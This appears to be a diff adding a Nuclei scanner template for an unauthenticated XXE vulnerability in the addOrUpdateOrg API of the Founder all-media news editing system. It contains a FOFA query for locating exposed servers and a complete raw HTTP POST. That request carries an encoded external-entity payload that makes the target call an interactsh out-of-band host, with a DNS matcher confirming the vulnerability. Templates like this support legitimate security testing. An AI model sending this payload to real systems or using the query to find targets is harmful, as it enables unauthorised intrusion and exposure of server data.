@@ -1,0 +1,30 @@
+id: fangzheng-addOrUpdateOrg-XXE
+info:
+  tags: fangzheng-addOrUpdateOrg-XXE
+  name: 方正畅享全媒体新闻采编系统 addOrUpdateOrg XXE漏洞
+  author: xc
+  severity: high
+  description: |-
+    fofa: app="FOUNDER-全媒体采编系统"
+    方正畅享全媒体新闻采编系统 addOrUpdateOrg 接口处存在XML实体注入漏洞，未经身份认证的攻击者可利用此漏洞获取服务器内部敏感数据，使系统处于极不安全状态。
+
+http:
+  - raw:
+      - |
+        POST /newsedit/api/orgUser/addOrUpdateOrg HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+
+        xmlStr=%3C!DOCTYPE%20root%20%5B%20%3C!ENTITY%20%25%20remote%20SYSTEM%20%22http://{{interactsh-url}}%22%3E%20%25remote;%5D%3E
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+        - "dns"
+
+
+
+
+
+
